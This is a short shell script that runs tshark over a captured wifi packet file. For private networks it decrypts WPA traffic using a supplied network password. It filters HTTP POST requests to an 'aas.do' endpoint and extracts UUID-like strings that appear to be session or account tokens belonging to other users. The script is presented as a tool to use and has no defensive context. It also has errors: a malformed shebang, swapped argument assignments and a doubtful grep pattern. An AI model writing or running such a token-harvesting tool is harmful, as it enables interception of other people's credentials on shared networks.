#/bin/sh

echo "If you're on a protected network, use: ./decode.sh <wifi network> <network password>"

if [ $# -ne 2 ]
    then
        echo "Attempting to decode packets (public wifi)..."
        sudo tshark -r data/yylol.pcap -R "http" -2 -R 'http.request.method == "POST" && http.request.uri contains "aas.do"' -x | cut -c 57- | tr -d '\n' | grep -o '$[a-zA-Z0-9]\{8\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{12\}...$[a-zA-Z0-9]\{8\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{12\}' | cut -c 42- | sort | uniq
    else
        echo "Attempting to decode packets (private wifi)..."
        NETWORK=$2
        PASSWORD=$1
        sudo tshark -r data/yylol.pcap -o wlan.enable_decryption:TRUE -o "uat:80211_keys:\"wpa-pwd\",\" $NETWORK:$PASSWORD\"" -R "http" -2 -R 'http.request.method == "POST" && http.request.uri contains "aas.do"' -x | cut -c 57- | tr -d '\n' | grep -o '$[a-zA-Z0-9]\{8\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{12\}...$[a-zA-Z0-9]\{8\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{4\}-[a-zA-Z0-9]\{12\}' | cut -c 42- | sort | uniq
fi
